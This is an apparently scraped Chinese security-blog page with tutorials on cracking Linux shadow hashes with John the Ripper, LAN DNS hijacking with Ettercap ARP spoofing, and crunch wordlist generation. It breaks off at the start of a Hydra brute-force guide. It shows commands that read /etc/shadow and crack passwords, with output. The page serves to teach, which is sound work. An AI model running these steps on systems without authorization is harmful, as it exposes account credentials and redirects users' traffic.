+<h1 id="二：John-破解-Linux-密码"><a href="#二：John-破解-Linux-密码" class="headerlink" title="二：John 破解 Linux 密码"></a>二：John 破解 Linux 密码</h1><h2 id="2-1-相关文件"><a href="#2-1-相关文件" class="headerlink" title="2.1 相关文件"></a>2.1 相关文件</h2><p>Linux 系统中存放账号、密码的两个重要文件 &#x2F;etc&#x2F;passwd 与 &#x2F;etc&#x2F;shadow</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/passwd		# 查看存放账户的文件内容</span><br><span class="line">cat /etc/passwd | head -1	</span><br><span class="line">root:x:0:0:root:/root:/usr/bin/zsh	# 被&quot;:&quot;划分为7个字段</span><br><span class="line">用户名：密码：用户ID（UID）：用户组ID（GID）：描述信息：主目录：默认shell</span><br><span class="line"></span><br><span class="line">cat /etc/shadow 	# 查看存放账户密码的文件内容</span><br><span class="line">cat /etc/shadow | head -1	# 被&quot;:&quot;划分为9个字段</span><br><span class="line">root:$y$j9T$yRBeGeHrNuu/yNBeAEqn40$.ljB8e37.pNGJXOVLiDDJUTTCcA..R8rXJcUmFCuBcB:19321:0:99999:7:::</span><br><span class="line">用户名：加密密码：最后一次修改时间：最小修改时间间隔：密码有效期：密码需要变更前的警告天数：密码过期后的宽限时间：账号失效时间：保留字段</span><br></pre></td></tr></table></figure>
+
+<h2 id="2-2-破解密码"><a href="#2-2-破解密码" class="headerlink" title="2.2 破解密码"></a>2.2 破解密码</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">将账户文件与密码文件合成一个文件</span></span><br><span class="line">unshadow /etc/passwd /etc/shadow &gt; shadow	</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">使用 john 破解账户 ssh 密码</span></span><br><span class="line">john --format=crypt shadow </span><br><span class="line"></span><br><span class="line">Using default input encoding: UTF-8</span><br><span class="line">使用默认输入编码：UTF-8</span><br><span class="line">Loaded 3 password hashes with 3 different salts (crypt, generic crypt(3) [?/64])</span><br><span class="line">用3种不同的盐加载3个密码散列（crypt, generic crypt(3) [?/64]）</span><br><span class="line">Cost 1 (algorithm [1:descrypt 2:md5crypt 3:sunmd5 4:bcrypt 5:sha256crypt 6:sha512crypt]) is 0 for all loaded hashes</span><br><span class="line">对于所有加载的哈希，成本1（算法[1:descrypt 2:md5crypt 3:sunmd5 4:bcrypt 5:sha256crypt 6:sha512crypt]）为0</span><br><span class="line">Cost 2 (algorithm specific iterations) is 1 for all loaded hashes</span><br><span class="line">对于所有加载的哈希，成本2（特定于算法的迭代）为1</span><br><span class="line">Proceeding with single, rules:Single</span><br><span class="line">单一进程，规则：单一</span><br><span class="line">Press &#x27;q&#x27; or Ctrl-C to abort, almost any other key for status</span><br><span class="line">按 &#x27;q&#x27; 或者 Ctrl-C 终止，几乎任何其他状态键</span><br><span class="line">root             (root)     </span><br><span class="line">root             (ghost)     </span><br><span class="line">Almost done: Processing the remaining buffered candidate passwords, if any.</span><br><span class="line">基本完成：处理剩余的缓存候选密码（如果有）</span><br><span class="line">Proceeding with wordlist:/usr/share/john/password.lst</span><br><span class="line">继续处理单词列表：/usr/share/john/password.lst</span><br><span class="line">123456           (test)     </span><br><span class="line">3g 0:00:00:18 DONE 2/3 (2022-11-27 01:26) 0.1648g/s 82.08p/s 82.19c/s 82.19C/s 123456..pepper</span><br><span class="line">Use the &quot;--show&quot; option to display all of the cracked passwords reliably</span><br><span class="line">使用 &quot;--show&quot; 选项可靠地显示所有破解的密码</span><br><span class="line">Session completed. </span><br><span class="line">会话完成。</span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+
+    
+    
+    
+
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://aiyingke.cn/2022/11/27/Ettercap-%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/RupertTears.jpg">
+      <meta itemprop="name" content="Rupert-Tears">
+      <meta itemprop="description" content="每个优秀的人，都有一段沉默的时光。那段时光，是付出了很多努力，却得不到结果的日子，我们把它叫做扎根。">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="爱影客">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2022/11/27/Ettercap-%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/" class="post-title-link" itemprop="url">Ettercap 使用教程</a>
+        </h2>
+
+        <div class="post-meta">
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2022-11-27 00:24:59 / 修改时间：01:06:10" itemprop="dateCreated datePublished" datetime="2022-11-27T00:24:59+08:00">2022-11-27</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">网络安全</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="一：DNS-概述"><a href="#一：DNS-概述" class="headerlink" title="一：DNS 概述"></a>一：DNS 概述</h1><p>在网络中，机器之间只认识 IP 地址，机器之间最终都要通过IP来相互访问。但是为了方便记忆，可以为 IP 地址设置一个对应的域名，通过访问域名，就可以找到对应的 IP 地址的网站。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">ping baidu.com</span><br><span class="line"></span><br><span class="line">正在 Ping baidu.com [110.242.68.66] 具有 32 字节的数据:</span><br><span class="line">来自 110.242.68.66 的回复: 字节=32 时间=21ms TTL=54</span><br><span class="line">来自 110.242.68.66 的回复: 字节=32 时间=20ms TTL=54</span><br><span class="line">来自 110.242.68.66 的回复: 字节=32 时间=19ms TTL=54</span><br><span class="line">来自 110.242.68.66 的回复: 字节=32 时间=21ms TTL=54</span><br><span class="line"></span><br><span class="line">110.242.68.66 的 Ping 统计信息:</span><br><span class="line">    数据包: 已发送 = 4，已接收 = 4，丢失 = 0 (0% 丢失)，</span><br><span class="line">往返行程的估计时间(以毫秒为单位):</span><br><span class="line">    最短 = 19ms，最长 = 21ms，平均 = 20ms</span><br></pre></td></tr></table></figure>
+
+<p>看似我们访问的是域名，而实际上是通过 IP 地址访问的百度。由 ping 命令，我们可以看出 baidu.com 到 110.242.68.66 的转换工作称为域名解析，域名解析需要专门的域名解析服务器来完成，DNS就是进行域名解析的服务器（Domain Name System 或者 Domain Name Service）。</p>
+<h1 id="二：DNS-原理"><a href="#二：DNS-原理" class="headerlink" title="二：DNS 原理"></a>二：DNS 原理</h1><p>DNS 查询时，会先在本地缓存中尝试查找，如果不存在或者记录过期，就继续向 DNS 服务器发起递归查询，这里的 DNS 服务器一般就是运营商的 DNS 服务器。</p>
+<ul>
+<li>第一步：客户机提出域名解析请求，并将该请求发送给本地的域名服务器。</li>
+<li>第二步：当本地的域名服务器收到请求后，就查询本地的缓存，如果有该记录项，则本地的域名服务器就直接把查询结果（域名对应的IP地址）返回。</li>
+<li>第三步：如果本地的缓存中没有该记录，则本地域名服务器就直接请求发给根域名服务器，然后根域名服务器再返回本地域名服务器一个所查询域（根的子域）的主域名服务器地址。</li>
+<li>第四步：本地服务器再向上一步返回的域名服务器发送请求，然后接受请求的服务器查询自己的缓存，如果没有该记录，则返回相关的下级的域名服务器地址。</li>
+<li>第五步：重复第四步，直到找到正确的记录。</li>
+<li>第六步：本地域名服务器把返回的结果保存到缓存，以备下一次使用，同时还将结果返回给客户机。</li>
+</ul>
+<h1 id="三：什么是-DNS-劫持"><a href="#三：什么是-DNS-劫持" class="headerlink" title="三：什么是 DNS 劫持"></a>三：什么是 DNS 劫持</h1><p>DNS 劫持又称域名劫持，是指通过某些手段取得某域名的解析控制权，修改此域名的解析结果，导致对该域名的访问由原 IP 地址转入到修改之后指定的 IP，其结果就是对特定网址不能访问或者访问的是假网址。</p>
+<p>如果可以冒充域名服务器，然后把查询的IP地址设置为攻击者的IP地址，这样的话，用户上网就只能看到攻击者的主页，而不是用户想要取得的网站主页，这就是DNS劫持的基本原理。</p>
+<p>DNS劫持其实并不是真的 “黑掉” 了对方的网站，而是冒名顶替、招摇撞骗罢了。</p>
+<h1 id="四：DNS-劫持危害"><a href="#四：DNS-劫持危害" class="headerlink" title="四：DNS 劫持危害"></a>四：DNS 劫持危害</h1><ul>
+<li>钓鱼诈骗<ul>
+<li>网上购物，网上支付有可能被恶意指向别的网站，泄密个人账户；</li>
+</ul>
+</li>
+<li>网站内出现恶意广告</li>
+<li>轻则影响网速，重则不能上网</li>
+</ul>
+<h1 id="五：Ettercap-进行内网-DNS-劫持"><a href="#五：Ettercap-进行内网-DNS-劫持" class="headerlink" title="五：Ettercap 进行内网 DNS 劫持"></a>五：Ettercap 进行内网 DNS 劫持</h1><ol>
+<li>准备欺骗页面，放在 &#x2F;var&#x2F;www&#x2F;html 目录下并启动</li>
+<li>配置 ettercap 工具配置文件<ul>
+<li>leafpad &#x2F;etc&#x2F;ettercap&#x2F;etter.dns</li>
+<li>注释记录→添加记录→保存退出</li>
+</ul>
+</li>
+<li>设置 ettercap 的配置<ul>
+<li>ettercap -G 启动 Ettercap</li>
+<li>启动嗅探→ 设置eth0网卡 → 扫描主机 → 将网关与主机添加到target选项 → 选择ARP欺骗 → 选择 DNS spoof 欺骗模块 → 点击start 开始欺骗</li>
+</ul>
+</li>
+</ol>
+
+      
+    </div>
+
+    
+    
+    
+
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://aiyingke.cn/2022/11/26/crunch-%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/RupertTears.jpg">
+      <meta itemprop="name" content="Rupert-Tears">
+      <meta itemprop="description" content="每个优秀的人，都有一段沉默的时光。那段时光，是付出了很多努力，却得不到结果的日子，我们把它叫做扎根。">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="爱影客">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2022/11/26/crunch-%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/" class="post-title-link" itemprop="url">crunch 使用教程</a>
+        </h2>
+
+        <div class="post-meta">
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2022-11-26 16:07:25" itemprop="dateCreated datePublished" datetime="2022-11-26T16:07:25+08:00">2022-11-26</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-11-27 00:28:13" itemprop="dateModified" datetime="2022-11-27T00:28:13+08:00">2022-11-27</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">网络安全</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="一：简介"><a href="#一：简介" class="headerlink" title="一：简介"></a>一：简介</h1><p>crunch 是一种创建密码字典的工具，按照指定的规则生成密码字典，可以灵活的定制自己的字典文件。</p>
+<p>使用 crunch 工具生成的密码可以输出到屏幕，保存到文件、或者另一个程序。</p>
+<p>crunch 最厉害的就是知道密码的一部分细节后，可以针对性的生成字典。</p>
+<h1 id="二：规则"><a href="#二：规则" class="headerlink" title="二：规则"></a>二：规则</h1><h2 id="2-1-生成方式"><a href="#2-1-生成方式" class="headerlink" title="2.1 生成方式"></a>2.1 生成方式</h2><p>crunch生成字典的方式：</p>
+<ol>
+<li>指定生成26个字母或者数字的随机字典</li>
+<li>指定格式生成字典</li>
+<li>指定模板生成字典</li>
+<li>指定字符串生成字典</li>
+</ol>
+<h2 id="2-2-参数详情"><a href="#2-2-参数详情" class="headerlink" title="2.2 参数详情"></a>2.2 参数详情</h2><ul>
+<li>min：设定最小字符串长度（必选）</li>
+<li>max：设定最大字符串长度（必选）</li>
+<li>-o 将生成的字典保存在指定文件</li>
+<li>-t 指定密码输出的格式</li>
+<li>-p 指定元素组合</li>
+<li>特殊字符<ul>
+<li>%：代表数字</li>
+<li>^：代表特殊符号</li>
+<li>@：代表小写字母</li>
+<li>.：代表大写字母</li>
+</ul>
+</li>
+</ul>
+<h1 id="三：命令"><a href="#三：命令" class="headerlink" title="三：命令"></a>三：命令</h1><h2 id="2-1-crunch"><a href="#2-1-crunch" class="headerlink" title="2.1 crunch"></a>2.1 crunch</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">crunch   </span><br><span class="line"></span><br><span class="line">crunch version 3.6</span><br><span class="line"></span><br><span class="line">Crunch can create a wordlist based on criteria you specify.  The output from crunch can be sent to the screen, file, or to another program.</span><br><span class="line">crunch 可以基于你指定的标准创建一个单词表。crunch的输出key发送到屏幕、文件或者另一个程序。</span><br><span class="line"></span><br><span class="line">Usage: crunch &lt;min&gt; &lt;max&gt; [options]</span><br><span class="line">用法：crunch &lt;最小&gt; &lt;最大&gt; [选项]</span><br><span class="line">where min and max are numbers</span><br><span class="line">其中最小值和最大值是数字</span><br><span class="line"></span><br><span class="line">Please refer to the man page for instructions and examples on how to use crunch.</span><br><span class="line">有关如何使用crunch，请参考手册页的说明和实例。</span><br></pre></td></tr></table></figure>
+
+<h2 id="2-2-生成纯数字密码"><a href="#2-2-生成纯数字密码" class="headerlink" title="2.2 生成纯数字密码"></a>2.2 生成纯数字密码</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">生成一个最小字符串长度为两位、最大字符串长度为四位的字典。</span></span><br><span class="line">crunch 2 4 &gt; number.txt</span><br><span class="line"></span><br><span class="line">Crunch will now generate the following amount of data: 2357212 bytes</span><br><span class="line">crunch 现在将生成以下数量的数据：2357212 字节</span><br><span class="line">2 MB</span><br><span class="line">0 GB</span><br><span class="line">0 TB</span><br><span class="line">0 PB</span><br><span class="line">Crunch will now generate the following number of lines: 475228</span><br><span class="line">crunch 现在将生成以下行数：475228</span><br></pre></td></tr></table></figure>
+
+<h2 id="2-3-生成指定格式密码"><a href="#2-3-生成指定格式密码" class="headerlink" title="2.3 生成指定格式密码"></a>2.3 生成指定格式密码</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">生成7位数，以admin开头+2位数字的字典，保存到admin_num.txt中。</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">-t：指定以某种格式开头</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">%%：表示两位数字</span></span><br><span class="line">crunch 7 7 -t admin%% &gt; admin_num.txt</span><br><span class="line">Crunch will now generate the following amount of data: 800 bytes</span><br><span class="line">0 MB</span><br><span class="line">0 GB</span><br><span class="line">0 TB</span><br><span class="line">0 PB</span><br><span class="line">Crunch will now generate the following number of lines: 100 </span><br></pre></td></tr></table></figure>
+
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">生成以1520003开头的手机号</span></span><br><span class="line">crunch 11 11 -t 1520003%%%% &gt; mobile.txt</span><br><span class="line">Crunch will now generate the following amount of data: 120000 bytes</span><br><span class="line">0 MB</span><br><span class="line">0 GB</span><br><span class="line">0 TB</span><br><span class="line">0 PB</span><br><span class="line">Crunch will now generate the following number of lines: 10000 </span><br></pre></td></tr></table></figure>
+
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">指定的数字生成字典</span></span><br><span class="line">crunch 6 6 0123456789 &gt; num.txt                                  </span><br><span class="line">Crunch will now generate the following amount of data: 7000000 bytes</span><br><span class="line">6 MB</span><br><span class="line">0 GB</span><br><span class="line">0 TB</span><br><span class="line">0 PB</span><br><span class="line">Crunch will now generate the following number of lines: 1000000 </span><br><span class="line"></span><br><span class="line">crunch 6 6 -f /usr/share/crunch/charset.lst numeric &gt; num_repo.txt</span><br><span class="line">Crunch will now generate the following amount of data: 7000000 bytes</span><br><span class="line">6 MB</span><br><span class="line">0 GB</span><br><span class="line">0 TB</span><br><span class="line">0 PB</span><br><span class="line">Crunch will now generate the following number of lines: 1000000</span><br></pre></td></tr></table></figure>
+
+<h2 id="2-4-依据库文件生成密码"><a href="#2-4-依据库文件生成密码" class="headerlink" title="2.4 依据库文件生成密码"></a>2.4 依据库文件生成密码</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">-f：指定库文件</span></span><br><span class="line">crunch 6 6 -f /usr/share/crunch/charset.lst hex-lower -o repo.txt</span><br><span class="line">Crunch will now generate the following amount of data: 117440512 bytes</span><br><span class="line">112 MB</span><br><span class="line">0 GB</span><br><span class="line">0 TB</span><br><span class="line">0 PB</span><br><span class="line">Crunch will now generate the following number of lines: 16777216 </span><br><span class="line"></span><br><span class="line">crunch: 100% completed generating output</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">库文件</span></span><br><span class="line">cat /usr/share/crunch/charset.lst                                </span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">charset configuration file <span class="keyword">for</span> winrtgen v1.2 by Massimiliano Montoro (mao@oxid.it)</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Massimiliano Montoro 的 winrtgen v1.2 字符集配置文件(mao@oxid.it)</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">compatible with rainbowcrack 1.1 and later by Zhu Shuanglei &lt;shuanglei@hotmail.com&gt;</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">兼容 Zhu Shuanglei 的 rainbowcrack 1.1 以及更高版本。</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">hex-lower                     = [0123456789abcdef]</span><br><span class="line">十六进制小写</span><br><span class="line">hex-upper                     = [0123456789ABCDEF]</span><br><span class="line">十六进制大写</span><br><span class="line"></span><br><span class="line">numeric                       = [0123456789]</span><br><span class="line">数字的</span><br><span class="line">numeric-space                 = [0123456789 ]</span><br><span class="line">带有空格的数字</span><br><span class="line"></span><br><span class="line">symbols14                     = [!@#$%^&amp;*()-_+=]</span><br><span class="line">symbols14-space               = [!@#$%^&amp;*()-_+= ]</span><br><span class="line"></span><br><span class="line">symbols-all                   = [!@#$%^&amp;*()-_+=~`[]&#123;&#125;|\:;&quot;&#x27;&lt;&gt;,.?/]</span><br><span class="line">symbols-all-space             = [!@#$%^&amp;*()-_+=~`[]&#123;&#125;|\:;&quot;&#x27;&lt;&gt;,.?/ ]</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+
+<h2 id="2-4-指定元素组合生成字典"><a href="#2-4-指定元素组合生成字典" class="headerlink" title="2.4 指定元素组合生成字典"></a>2.4 指定元素组合生成字典</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">指定生成的字典，由 ghost、99、22 三个元素组成</span></span><br><span class="line">crunch 3 3 -p ghost 99 22 &gt; combination.txt                       </span><br><span class="line">Crunch will now generate approximately the following amount of data: 60 bytes</span><br><span class="line">0 MB</span><br><span class="line">0 GB</span><br><span class="line">0 TB</span><br><span class="line">0 PB</span><br><span class="line">Crunch will now generate the following number of lines: 6 </span><br></pre></td></tr></table></figure>
+
+<h1 id="四：练习"><a href="#四：练习" class="headerlink" title="四：练习"></a>四：练习</h1><ul>
+<li>以26个字母为元素最小5位，最大6位的组合，重定向保存到exercise1.txt字典文件中。<ul>
+<li>crunch 5 6 &gt; exericise1.txt</li>
+</ul>
+</li>
+<li>以root字符开头，第五位、第六位为特殊符号，七八九位为123结尾的9位数字字典，重定向保存到exercise2.txt字典文件中<ul>
+<li>crunch 9 9 -t root^^123 &gt; exercise3.txt</li>
+</ul>
+</li>
+<li>指定库文件中的 hex-upper 模板生成6位的字典，使用 -o 参数，保存在 exercise4.txt 字典文件中<ul>
+<li>crunch 6 6 -f &#x2F;usr&#x2F;share&#x2F;crunch&#x2F;charset.lst  hex-upper -o exercise4.txt</li>
+</ul>
+</li>
+<li>生成 pdd、1611、0101 这个三个字符串的随机字典，重定向保存到 exercise5.txt 字典文件中<ul>
+<li>crunch 3 3 -p pdd 1611 0101 &gt; exercise5.txt</li>
+</ul>
+</li>
+</ul>
+
+      
+    </div>
+
+    
+    
+    
+
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://aiyingke.cn/2022/11/26/Hydra-%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/RupertTears.jpg">
+      <meta itemprop="name" content="Rupert-Tears">
+      <meta itemprop="description" content="每个优秀的人，都有一段沉默的时光。那段时光，是付出了很多努力，却得不到结果的日子，我们把它叫做扎根。">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="爱影客">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2022/11/26/Hydra-%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/" class="post-title-link" itemprop="url">Hydra 使用教程</a>
+        </h2>
+
+        <div class="post-meta">
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2022-11-26 13:37:27 / 修改时间：16:04:44" itemprop="dateCreated datePublished" datetime="2022-11-26T13:37:27+08:00">2022-11-26</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">网络安全</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="一：简介"><a href="#一：简介" class="headerlink" title="一：简介"></a>一：简介</h1><p>Hydra 是一款非常强大的暴力破解工具，可以利用它对众多协议进行口令、账号、密码的爆破，支持FTP、MySQL、SMTP、TELNET、SSH等众多的协议爆破。</p>
+<p>Hydra 是一个验证性质的工具，主要目的是：展示安全研究人员从远程获取一个系统认证权限。</p>
+<h1 id="二：基础指令"><a href="#二：基础指令" class="headerlink" title="二：基础指令"></a>二：基础指令</h1><h2 id="2-1-概述"><a href="#2-1-概述" class="headerlink" title="2.1 概述"></a>2.1 概述</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">hydra</span><br><span class="line"></span><br><span class="line">Hydra v9.3 (c) 2022 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).</span><br><span class="line">Hydra v9.3 2022的作者：van Hauser/THC &amp; David Maciejak。请不要在军事或者特情局组织中使用，或者用于非法目的（这是非约束性的，反正这些****无视法律和道德）</span><br><span class="line"></span><br><span class="line">Syntax: hydra [[[-l LOGIN|-L FILE] [-p PASS|-P FILE]] | [-C FILE]] [-e nsr] [-o FILE] [-t TASKS] [-M FILE [-T 